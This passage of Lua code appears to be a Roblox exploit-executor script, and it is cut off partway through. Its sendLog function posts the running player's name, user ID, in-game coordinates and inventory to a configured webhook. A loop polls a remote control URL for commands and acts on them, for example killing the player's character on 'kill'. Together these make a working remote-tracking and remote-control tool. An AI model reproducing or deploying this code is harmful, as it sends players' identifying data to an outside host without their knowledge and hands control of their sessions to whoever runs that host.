local function requestFunc(options)
    local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    if fn then return fn(options) end
end

local function getInventory()
    local tools = {}
    local backpack = lp:FindFirstChild("Backpack")
    local char = lp.Character
    
    if backpack then
        for _, v in ipairs(backpack:GetChildren()) do
            if v:IsA("Tool") then table.insert(tools, v.Name) end
        end
    end
    if char then
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end
        end
    end
    return #tools > 0 and table.concat(tools, ", ") or "Empty"
end

local function sendLog(title, desc, color)
    task.spawn(function()
        local pos = "Unknown"
        pcall(function()
            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                pos = string.format("X: %.1f, Y: %.1f, Z: %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
            end
        end)

        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0xFF0000,
                ["fields"] = {
                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
                    {["name"] = "🎮 Игра", ["value"] = "[Link](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
                    {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
                },
                ["footer"] = {["text"] = "AxM v38 Cleaned • " .. os.date("%X")}
            }}
        }

        requestFunc({
            Url = settings.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

task.spawn(function()
    local last_cmd = ""
    local flingConnection
    
    pcall(function()
        local res = game:HttpGet(settings.control .. "?t=" .. tick())
        last_cmd = res:gsub("%s+", ""):lower()
    end)

    while true do
        task.wait(settings.check_delay)
        
        local ok, res = pcall(function() 
            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
        end)

        if ok and res then
            local clean_res = res:match("^%s*(.-)%s*$")
            local current_cmd = clean_res:lower()

            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                last_cmd = current_cmd
                
                local char = lp.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")

                if current_cmd == "kill" and hum then
                    hum.Health = 0
